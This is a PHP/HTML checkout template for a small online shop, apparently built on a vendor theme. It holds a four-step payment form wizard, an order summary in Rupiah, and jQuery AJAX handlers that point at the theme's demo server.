

<!DOCTYPE html>
<html lang="en">
    
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
                <meta name="author" content="BDTASK">
        <meta name="description" content="">

        <title>Home</title>
   
        <!-- Favicons --> 
        <link rel="icon" type="image/png" href="<?php echo base_url().'my-assets/image/logo/b561929d20e2e5728e05d4f0bbafe7f7.png'?>">
        
        <!-- Bootstrap core CSS -->
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
        <!-- Bootstrap core CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/bootstrap/css/bootstrap.min.css'?>" rel="stylesheet">  
        
        <!-- FontAwesome Icon CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/font-awesome/css/font-awesome.min.css'?>" rel="stylesheet" type="text/css"> 
        
        <!-- Jquery UI CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.css'?>" rel="stylesheet"> 
        
        <!-- Owl Carousel CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.css'?>" rel="stylesheet">
        
        <!-- Animate CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/wow-js/animate.css'?>" rel="stylesheet"> 
        
        <!-- Lightbox CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/lightbox/css/lightbox.min.css'?>" rel="stylesheet"> 

        <!-- Custom styles for this template -->
        <link href="<?php echo base_url().'assets/website/css/style.css'?>" rel="stylesheet"> 
        <!-- EasyZoom CSS -->
        <link rel="stylesheet" href="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.css'?>">

        <!-- Responsive Style -->
        <link href="<?php echo base_url().'assets/website/css/responsive.css'?>" rel="stylesheet">

        <!-- Include SmartWizard CSS -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard.css'?>" rel="stylesheet" type="text/css">

        <!-- Optional SmartWizard theme -->
        <link href="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/css/smart_wizard_theme_dots.css'?>" rel="stylesheet" type="text/css">

        <!-- Jquery  -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery/jquery-3.2.1.min.js'?>" type="text/javascript"></script>

        <!-- jquery-ui.min.js -->
        <script src="<?php echo base_url().'assets/website/vendor/jquery-ui/jquery-ui.min.js'?>" type="text/javascript"></script>
        
        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <!--wizard-->
    
    <link href="<?php echo base_url().'assets'?>/css/font-awesome.min.css" rel="stylesheet"> 
    
    <link href="<?php echo base_url().'assets'?>/css/multistep.min.css" rel="stylesheet">
    <link href="<?php echo base_url().'assets'?>/css/animate.css" rel="stylesheet">
     
    
    </head>

    <body>
        <!--==== Preloader =======-->
        <div class="preloader"></div>

        <!--========== Header Top Area ==========-->
       <?php      $this->load->view('header_top');             ?> 
        <!--========== End Header Top Area ==========-->
        
        <!--====== Header Area ======-->
<header>
    <!-- Main Header Area -->
   <?php      $this->load->view('header_main');             ?> 
    

   
</header>
<!--===== End Header Area =======-->

    <style type="text/css">
        input.loading {
            background: #fff url(assets/website/image/resize.gif) no-repeat center !important;
        }
         .btn-kanan{
                float: right;
                height: 50px;
            }
            .btn-kanan:hover{
                color:white;
                background: black;
            }
            th{
                background: #928d8d;
                color: white;
                text-align: center;
            }
            
            .bg_red{
              color: white;
              background: red;
            }
            .bg_blue{
              color: white;
              background: blue;
            }
            .bg_yellow{
              color: white;
              background: yellow;
            }
            .bg_green{
              color: white;
              background: green;
            }
            .center{
                    text-align: center;
            }
           
            .radius{
                border-radius: 50px;
            }
            
            .table td, .table th{
                vertical-align: middle;
            }
            
            .max200{
                
                max-height:200px; 
                
            }
            .table .thead-dark th{
               color: #fff;
                background-color: #22df00;
                border-color: #22df00; 
                
            }
        .shopping_cart_area .shopping_cart_inner .table thead tr th:last-child{
            width: 20%;
        }
    </style>

    <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
        
        //Product search by product name
        $('body').on('keyup', '#product_name', function() {

            var product_name = $('#product_name').val();
            var category_id  = $('#select_category').val();

            //Product name check
            if (product_name == 0) {
                $('.search_results').html(' ');
                return false;
            }
            
            $.ajax({
                type: "post",
                async: false,
                url: 'http://isshue.bdtask.com/isshue-v1.5/website/Category/category_product_search_ajax',
                data: {product_name: product_name,category_id:category_id},
                beforeSend: function(){
                    $('#product_name').addClass('loading');
                },
                success: function(data) {
                    $('#product_name').removeClass('loading');
                    if (data) {
                        $('.search_results').html(data);
                    }
                },
                error: function() {
                    alert('Request Failed, Please check your code and try again!');
                }
            });
        });
    </script>

<!-- Product delete from cart by ajax -->
<script type="text/javascript">
    $('body').on('click', '.delete_cart_item', function() {
        var row_id  = $(this).attr('name');
        $.ajax({
            type: "post",
            async: true,
            url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/delete_cart/',
            data: {row_id:row_id},
            success: function(data) {
                $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
            },
            error: function() {
                alert('Request Failed, Please check your code and try again!');
            }
        });
    });  
</script>           


<!---->
        
        
    <!--Multi Step Wizard Start-->
   <div id="rms-wizard" class="rms-wizard">
   <!--Wizard Container-->
    <div class="rms-container">
       <!--Wizard Header-->
        <div class="">
            <h2 class="title">Advance Payment <span>Form Wizard</span></h2>
        </div>
        <!--Wizard Header Close--> 
        <div class="rms-form-wizard">
           <!--Wizard Step Navigation Start-->
            <div class="rms-step-section" data-step-counter="false" data-step-image="false">
                <ul class="rms-multistep-progressbar"> 
                    <li class="rms-step rms-current-step">
                        <span class="step-icon"><i class="fa fa-lock" aria-hidden="true"></i></span>
                        <span class="step-title">Account Information</span>
                        <span class="step-info">Enter your first time username password details</span>
                    </li> 
                    <li class="rms-step ">
                        <span class="step-icon"><i class="fa fa-user" aria-hidden="true"></i></span>
                        <span class="step-title">Personal Information</span>
                        <span class="step-info">Enter your first time username password details</span>
                    </li>
                    <li class="rms-step ">
                        <span class="step-icon ml10"><i class="fa fa-credit-card" aria-hidden="true"></i></span>
                        <span class="step-title">Payment Information</span>
                        <span class="step-info">Enter your first time username password details</span>
                    </li>
                    <li class="rms-step ">
                        <span class="step-icon"><i class="fa fa-file-text" aria-hidden="true"></i></span>
                        <span class="step-title">Confirm Your Details</span>
                        <span class="step-info">Enter your first time username password details</span>
                    </li>
                </ul>
            </div>
            <!--Wizard Navigation Close-->
            <!--Wizard Content Section Start-->
            <div class="rms-content-section">
                <div class="rms-content-box rms-current-section">
                    <div class="rms-content-area"> 
                        <div class="rms-content-title">
                            <div class="leftside-title"><b> <i class="fa fa-lock" aria-hidden="true"></i> Account</b> Information</div>
                            <div class="step-label">Step 1 - 4 </div> 
                        </div>
                        <div class="rms-content-body"> 
                            <div class="row">
                                <div class="col-md-8">
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                                <label for="username">Username</label>
                                            <div class="inpt-group">
                                                <span class="inpt-group-addon"><i class="fa fa-user" aria-hidden="true"></i></span> 
                                                <input type="text" name="username" id="username" class="inpt-control required" placeholder="John_Doe"> 
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                        <p class="tooptip-content"><!--Lorem Ipsum is simply dummy text of the printing and
														typesetting industry. Lorem Ipsum has been the industry's
														standard dummy text ever since the 1500s--></p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div>  
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                                <label for="password">Password</label>
                                                <div class="inpt-group">
                                                    <input type="password" name="password" min="5" max="20" id="password" class="inpt-control required" placeholder="Password">
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                        <p class="tooptip-content"></p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div> 
                                                </div> 
                                            </div>
                                         </div>
                                    </div>
                                  <!--  <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                                <label for="confirmpassword">Confirm Password</label>
                                                <div class="inpt-group">
                                                    <input type="password" name="cpassword" id="cpassword" class="inpt-control required" placeholder="Password">
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                        <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
                                                            typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div>
                                                </div>
                                            </div>
                                         </div>
                                    </div>-->
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                               <label for="Email">Email</label>
                                               <div class="inpt-group"> 
                                                   <span class="inpt-group-addon"><i class="fa fa-envelope" aria-hidden="true"></i></span>
                                                   <input type="text" name="email" id="email" class="inpt-control required" placeholder="Please Enter your mail ID">
                                                   <div class="form-tooltip tooltip-edge">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content"><!--Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s--></p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div>
                                            </div>
                                         </div>
                                    </div>
                                </div> 
                            </div> 
                        </div> 
                    </div>
                </div>
                <div class="rms-content-box">
                     <div class="rms-content-area">
                        <div class="rms-content-title">
                            <div class="leftside-title"><b> <i class="fa fa-user" aria-hidden="true"></i> Personal</b> Information</div>
                            <div class="step-label">Step 2 - 4 </div> 
                        </div>
                         <div class="rms-content-body"> 
                             <div class="row">
                                 <div class="col-md-8">
                                    <div class="row">
                                        <div class="col-md-4">
                                            <div class="inpt-form-group"> 
                                               <label for="Salutation">Salutation</label>
                                               <div class="inpt-group dropdown-select-icon"> 
                                                   <select name="salutation" id="salutation" class="inpt-control select required">
                                                       <option value="null" disabled selected>Select</option>
								    				    <option value="1">Mr</option>
								    				    <option value="2">Mrs</option>
								                    </select> 
                                                </div>
                                            </div>
                                         </div>
                                        <div class="col-md-8">
                                            <div class="inpt-form-group"> 
                                               <label for="gender">Gender</label>
                                               <div class="inpt-group dropdown-select-icon"> 
                                                   <select name="gender" id="gender" class="inpt-control select required">
                                                       <option value="null" disabled selected>Select Gender</option>
								    				    <option value="1">Male</option>
								    				    <option value="2">Female</option>
								                    </select> 
                                                </div>
                                            </div>
                                         </div>
                                    </div>
                                   <!-- <div class="row">
                                       <div class="col-md-6">
                                           <div class="inpt-form-group"> 
                                               <label for="firstname">First Name</label>
                                               <div class="inpt-group">
                                                   <input type="text" name="firstname" id="firstname" class="inpt-control required" placeholder="First Name">
                                                   <div class="form-tooltip">
                                                       <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
                                                           typesetting industry. Lorem Ipsum has been the industry's
									   					standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="inpt-form-group"> 
                                                <label for="lastname">Last Name</label>
                                                <div class="inpt-group">
                                                    <input type="text" name="lastname" id="lastname" class="inpt-control required" placeholder="Last name">
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                        <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
                                                            typesetting industry. Lorem Ipsum has been the industry's
									   					standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div>
                                                </div>
                                            </div>
                                         </div> 
                                    </div> 
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                               <label for="Email">Email</label>
                                               <div class="inpt-group"> 
                                                   <span class="inpt-group-addon"><i class="fa fa-envelope" aria-hidden="true"></i></span>
                                                   <input type="text" name="email" id="email" class="inpt-control required" placeholder="Please Enter your mail ID">
                                                   <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div>
                                            </div>
                                         </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                               <label for="phone">Phone</label>
                                               <div class="inpt-group"> 
                                                   <span class="inpt-group-addon"><i class="fa fa-phone fa-rotate-270" aria-hidden="true"></i></span>
                                                   <input type="text" name="phone" id="phone" class="inpt-control required" placeholder="Please Enter your Phone Number">
                                                   <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div>
                                            </div>
                                         </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-4">
                                            <div class="inpt-form-group"> 
                                               <label for="zipcode">Zip Code</label>
                                               <div class="inpt-group">  
                                                   <input type="text" name="zipcode" id="zipcode" class="inpt-control required" placeholder="Code"> 
                                                </div>
                                            </div>
                                         </div>
                                        <div class="col-md-8">
                                            <div class="inpt-form-group"> 
                                               <label for="state">State Select</label>
                                                <div class="inpt-group dropdown-select-icon"> 
                                                   <select name="state" id="state" class="inpt-control select required">
                                                       <option value="" disabled selected>Select State</option>
								    				    <option value="1">Delhi</option>
								    				    <option value="2">Noida</option>
								    				    <option value="2">Himachal Pradesh</option>
								    				    <option value="2">Punjab</option>
								                    </select> 
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div> 
                                            </div>
                                         </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                               <label for="address">Home Address</label>
                                               <div class="inpt-group">  
                                                   <input type="text" name="address" id="address" class="inpt-control required" placeholder="Please Enter your Home Address">
                                                   <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div>
                                            </div>
                                         </div>
                                    </div>-->
                                    <div class="row"> 
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                               <label for="country">Select Country</label>
                                                <div class="inpt-group dropdown-select-icon"> 
                                                   <select name="country" id="country" class="inpt-control select required">
                                                       <option value="" disabled selected>Select Country</option>
								    				    <option value="1">USA</option>
								    				    <option value="2">INDIA</option>
								    				    <option value="2">UK</option> 
								                    </select> 
                                                    <div class="form-tooltip tooltip-edge">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div> 
                                            </div>
                                         </div>
                                    </div>
                                </div> 
                             </div> 
                        </div> 
                    </div> 
                </div>
                <div class="rms-content-box">
                     <div class="rms-content-area">
                        <div class="rms-content-title">
                            <div class="leftside-title"><b> <i class="fa fa-credit-card" aria-hidden="true"></i> Payment</b> Information</div>
                            <div class="step-label">Step 3 - 4 </div>
                           
                        </div>
                        <div class="rms-content-body"> 
                            <div class="row">
                                <div class="col-md-8">
                                <div class="row"> 
                                     <div class="col-md-12">
                                         <div class="inpt-form-group"> 
                                            <label for="cardtype">Card Type</label>
                                             <div class="inpt-group dropdown-select-icon"> 
                                                <select name="cardtype" id="cardtype" class="inpt-control select required">
                                                    <option value="" disabled selected>Select Credit Card type</option>
								    				    <option value="1">Visa Card</option>
								    				    <option value="2">Master Card</option> 
								                    </select> 
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div> 
                                            </div>
                                         </div>
                                    </div>
                                  <!--  <div class="row">
                                        <div class="col-md-9">
                                            <div class="inpt-form-group"> 
                                                <label for="cardnum">Card Number</label>
                                                <div class="inpt-group">
                                                    <input type="text" name="cardnum" id="cardnum" class="inpt-control required" placeholder="123-456-789">
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                        <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div> 
                                                </div> 
                                            </div>
                                         </div>
                                        <div class="col-md-3">
                                            <div class="inpt-form-group"> 
                                                <label for="cvc">C2VC</label>
                                                <div class="inpt-group">
                                                    <input type="text" name="cvc" id="cvc" class="inpt-control required" placeholder="***">
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                        <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                    </div> 
                                                </div> 
                                            </div>
                                         </div>
                                    </div> 
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="inpt-form-group"> 
                                               <label for="holdername">Card Holder Name</label>
                                               <div class="inpt-group"> 
                                                   <span class="inpt-group-addon"><i class="fa fa-user" aria-hidden="true"></i></span>
                                                   <input type="text" name="holdername" id="holdername" class="inpt-control required" placeholder="John Doe">
                                                   <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
								    						typesetting industry. Lorem Ipsum has been the industry's
								    						standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div>
                                            </div>
                                         </div>
                                    </div>
                                    <div class="row"> 
                                        <div class="col-md-4">
                                            <div class="inpt-form-group"> 
                                               <label for="exmonth">Expiry Month</label>
                                                <div class="inpt-group dropdown-select-icon"> 
                                                   <select name="exmonth" id="exmonth" class="inpt-control select required">
                                                       <option value="" disabled selected>Expiry Month</option>
									   			    <option value="1">01</option> 
									   			    <option value="1">02</option> 
									   			    <option value="1">03</option> 
									   			    <option value="1">04</option> 
									   			    <option value="1">05</option> 
									   			    <option value="1">06</option> 
									   			    <option value="1">07</option> 
									   			    <option value="1">08</option> 
									   			    <option value="1">09</option> 
									   			    <option value="1">10</option> 
								                    </select> 
                                                    <div class="form-tooltip">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
									   					typesetting industry. Lorem Ipsum has been the industry's
									   					standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div> 
                                            </div>
                                        </div>
                                        <div class="col-md-4">
                                           <div class="inpt-form-group"> 
                                              <label for="exyear">Expiry Year</label>
                                               <div class="inpt-group dropdown-select-icon"> 
                                                  <select name="exyear" id="exyear" class="inpt-control select required">
                                                      <option value="" disabled selected>Expiry Year</option>
										  		    <option value="1">2017</option>  
										  		    <option value="1">2018</option>  
										  		    <option value="1">2019</option>  
										  		    <option value="1">2020</option>  
										  		    <option value="1">2021</option>  
								                    </select> 
                                                    <div class="form-tooltip tooltip-edge">
                                                        <span class="tooltip-title">Why do we need this info?</span>
                                                       <p class="tooptip-content">Lorem Ipsum is simply dummy text of the printing and
										  				typesetting industry. Lorem Ipsum has been the industry's
										  				standard dummy text ever since the 1500s</p>
                                                        <span class="tooltip-info">Your information is Safe here & never shared.</span>
                                                   </div> 
                                                </div> 
                                            </div>
                                        </div>
                                    </div>-->
                                </div> 
                            </div> 
                        </div> 
                    </div> 
                </div>
                <div class="rms-content-box">
                    <div class="rms-content-area">
                        <div class="rms-content-title">
                            <div class="leftside-title"><b> <i class="fa fa-file-text" aria-hidden="true"></i> Confirm</b> Details</div>
                            <div class="step-label">Step 4 - 4 </div> 
                        </div>
                        <div class="rms-content-body"> 
                            <div class="row">
                                <div class="col-md-8">
                              
                                    
                                    <!---->
                                
                                    
                                    <div class="shopping_cart_area">
    <div class="container">
        <div class="shopping_cart_inner">
            <div class="table-responsive"> 
                <table class="table table-striped"> 
                    <thead class="thead-dark"> 
                        <tr> 
                            <th>Image</th> 
                            <th>Product Name</th>                             
                            <th>Qnty</th> 
                            <th>Price</th> 
                            <th colspan="2">Total</th> 
                           
                        </tr> 
                    </thead> 
                    <tbody> 

                                                                        
<input type="hidden" name="1[rowid]" value="0f7b7f5f8cf0ded4442e3d2e91c79b0b">
 <?php foreach ($cart as $items) { ?>
                        <tr>
                            <td><img src="<?php echo base_url()?>my-assets/image/product/<?php echo $items['gbr']; ?>" alt=""></td>
                            <td><?php echo $items['name']; ?></td>
                           
                            
                            <td><?php echo $items['qty']; ?></td>
                            
                            <td>Rp. <?php echo number_format($items['price']); ?></td>
                            <td>Rp. <?php echo number_format($items['price']*$items['qty']); ?></td>
                            
                            
                        </tr>
<?php } ?> 
             

                                                                       
                    </tbody> 
                </table> 
            </div>
        </div>
    </div>
</div>
                                    
                                    
                                    
                                    
                                    <!---->
                                    
                                    
                                </div>
                                <div class="col-md-4" style="margin-top: 25px;">
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="desc-container">
                                                <div class="desc-table"><p>SHIPPING &amp; BILLING ADDRESS</p>
                                                    <table>
                                                        <tbody>
                                                            <tr>
                                                                <td class="desc-label">Username</td>
                                                                <td class="desc-val">John_503in</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Email ID</td>
                                                                <td class="desc-val">john_doe@gmail.com</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Full Name</td>
                                                                <td class="desc-val">John Doe</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Gender</td>
                                                                <td class="desc-val">Male</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Telephone NO.</td>
                                                                <td class="desc-val">325-555-1234</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Address</td>
                                                                <td class="desc-val">111 W.App Ave. Suite 123, Sunway, CA</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Zip Code</td>
                                                                <td class="desc-val">94086</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Country</td>
                                                                <td class="desc-val">USA</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Card Type</td>
                                                                <td class="desc-val">Visa</td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Telephone NO.</td>
                                                                <td class="desc-val">4519-1235-9869-4321</td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div>
                                        </div>
                                         <div class="col-md-12">
                                            <div class="desc-container">
                                                <div class="desc-table"><p>ORDER SUMMARY</p>
                                                    <table> 
                                                        <tbody>
                                                            <tr>
                                                                <td class="desc-label">Subtotal (X item)</td>
                                                                <td class="desc-val"><b><?php echo 'Rp.'.$total; ?></b></td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Biaya pengiriman</td>
                                                                <td class="desc-val"><b>Rp. <?php echo number_format($items['price']*2/$items['qty']); ?></b></td>
                                                            </tr>
                                                            <tr>
                                                                <td>
                                                                    <div class="enter_coupon">
                                                                        <label>Enter your coupon here:</label><input type="hidden" name="grandtotal" id="gt" value="<?php echo $total; ?>">
                                                                        <input type="text" name="coupon_code" placeholder="Enter your coupon here" required="">
                                                                        <button type="submit" id="tombol">Apply Coupon</button>
                                                                    </div>
                                                                </td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label">Discount</td>
                                                                <td class="desc-val"><b>Rp.- <?php echo number_format($items['price']); ?></b></td>
                                                            </tr>
                                                            <tr>
                                                                <td class="desc-label"><h4>TOTAL</h4></td>
                                                                <td class="desc-val">
                                                                    <b style="font-size:20px; color:gree"><?php echo 'Rp.'.$total; ?></b></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div>
                                        </div>
                                    </div> 
                                </div> 
                            </div> 
                        </div> 
                    </div> 
                </div>
            </div>
            <!--Wizard Content Section Close-->
            <!--Wizard Footer section Start-->
            <div class="rms-footer-section">
                <div class="">
                    <span class="next btn btn-default bg_green" >
                        <a href="javascript:void(0)" class="btn" style="color:white;">Next Step
                           
                        </a>
                    </span>
                    <span class="prev btn btn-default bg_red">
                        <a href="javascript:void(0)" class="btn" style="color:white;" >Previous Step
                             
                        </a>
                    </span>
                    <span class="submit btn btn-default bg_green">
                        <a href="javascript:void(0)" class="btn" style="color:white;" >Submit
                             
                        </a>
                    </span> 
                </div>
            </div>
            <!--Wizard Footer Close-->
        </div>
    </div>
    <!--Wizard Container Close-->
    </div>
    <!--Multi Step Wizard Close-->
        
        

<!--=========== footer Area ===========-->
 
 <?php      $this->load->view('footer');         

        function rupiah($angka){
    
            echo "Rp " . number_format($angka,2,',','.');
                // return $hasil_rupiah;
         
        } 

  
        function limit_words($string, $word_limit){
            $words = explode(" ",$string);
            return implode(" ",array_splice($words,0,$word_limit));
        }
   ?>  
        
<!--=========== ./footer Area ===========-->




        <!-- Bootstrap  -->
        <script data-cfasync="false" src="cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/tether.min.js'?>" type="text/javascript"></script>
        <script src="<?php echo base_url().'assets/website/vendor/bootstrap/js/bootstrap.min.js'?>" type="text/javascript"></script>

        <script type="text/javascript" src="cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js'?>"></script>

        <!-- Include SmartWizard JavaScript source -->
        <script type="text/javascript" src="<?php echo base_url().'assets/website/vendor/SmartWizard-master/dist/js/jquery.smartWizard.min.js'?>"></script>

        <!-- Owl Carousel -->
        <script src="<?php echo base_url().'assets/website/vendor/owl-carousel/owl.carousel.min.js'?>" type="text/javascript"></script>

        <!-- EasyZoom -->
        <script src="<?php echo base_url().'assets/website/vendor/easyzoom/easyzoom.min.js'?>" type="text/javascript"></script>

        <!-- DSCount JS -->
        <script src="<?php echo base_url().'assets/website/vendor/dscountdown/dscountdown.min.js'?>" type="text/javascript"></script>
        
        <!-- WoW js -->
        <script src="<?php echo base_url().'assets/website/vendor/wow-js/wow.min.js'?>"></script>
        
        <!-- Lightbox js -->
        <script src="<?php echo base_url().'assets/website/vendor/lightbox/js/lightbox.min.js'?>"></script>  

        <!-- Simple Share js -->
        <script src="<?php echo base_url().'assets/website/js/jquery.simpleSocialShare.min.js'?>"></script>

        <!-- Custom scripts for this template -->
        <script src="<?php echo base_url().'assets/website/js/theme.js'?>"></script>

        <script type="text/javascript">

            //Simple share
            $('.share-button').simpleSocialShare();
            
            //Change language ajax
            $('body').on('change', '#change_language', function() {
                var language  = $('#change_language').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_language',
                    data: {language:language},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Change currency ajax
            $('body').on('change', '#change_currency', function() {
                var currency_id  = $('#change_currency').val();
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/change_currency',
                    data: {currency_id:currency_id},
                    success: function(data) {
                        if (data == 2) {
                            location.reload();
                        }else{
                            location.reload();
                        }
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }); 

            //Add to cart by ajax
            function add_to_cart(id){
                var product_id = $('#product_id_'+id).val();
                var price      = $('#price_'+id).val();
                var discount   = $('#discount_'+id).val();
                var qnty       = $('#qnty_'+id).val();
                var image      = $('#image_'+id).val();
                var name       = $('#name_'+id).val();
                var model      = $('#model_'+id).val();
                var supplier_price      = $('#supplier_price_'+id).val();
                var cgst      = $('#cgst_'+id).val();
                var cgst_id   = $('#cgst_id_'+id).val();
                var sgst      = $('#sgst_'+id).val();
                var sgst_id   = $('#sgst_id_'+id).val();
